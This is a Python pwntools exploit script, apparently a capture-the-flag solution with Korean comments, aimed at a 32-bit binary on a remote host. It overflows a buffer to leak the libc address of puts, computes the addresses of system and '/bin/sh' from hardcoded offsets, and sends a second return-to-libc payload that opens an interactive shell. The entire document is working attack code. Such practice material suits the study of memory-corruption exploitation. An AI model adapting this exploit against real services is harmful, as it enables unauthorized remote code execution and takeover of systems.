
from pwn import *
context.terminal=['tmux', 'splitw', '-h']

#p = process("./prob2")
p = remote("fsi.zzado.kr", 9933)
e = ELF("./03 Pwn/prob3")
lib = ELF('./03 Pwn/libc.so.6')

puts_plt = e.plt['puts']
puts_got = e.got['puts']
main = e.symbols['main']
#log.info(hex(puts_GOT))

# PLT는 런타임시 GOT로 점프하기 위한 주소라서 system이 소스코드 내부에 없으면
# 2번 문제처럼 e.plt['system'] 해도 못찾는다.
# 그래서 실제 GOT의 system이 필요하다.
# puts의 실제 GOT를 구하고 제공된 libc 파일 기준으로 offset을 동일하게 더해서 
# system함수의 GOT를 알아낸다. 
p.recv()
# puts의 GOT를 구함
payload =  b'a' * 0x20
payload += b'b' * 0x4
payload += p32(puts_plt)
payload += p32(main)
payload += p32(puts_got)
p.send(payload)


## Leak libc
p.recvuntil(b'\n')
leak_data = u32(p.recv()[:4]) # 현재 실행중인 프로세스의 puts()의 GOT 주소를 알아냄
# 원본 라이브러리 puts()의 GOT 주소를 빼면 현재 프로세스 GOT의 시작 주소를 알 수 있음

# puts  	000732A0	
# system	00048170	
# /bin/sh   001BD0D5
# puts와 system의 차이 : 0x2B130
# puts와 /bin/sh의 차이 : 0x149E35

system = leak_data - 0x2B130
binsh = leak_data + 0x149E35

## system("/bin/bash")
payload =  b'a' * 0x20
payload += b'b' * 0x4
payload += p32(system)
payload += p32(main)
payload += p32(binsh)
p.send(payload)

p.interactive() 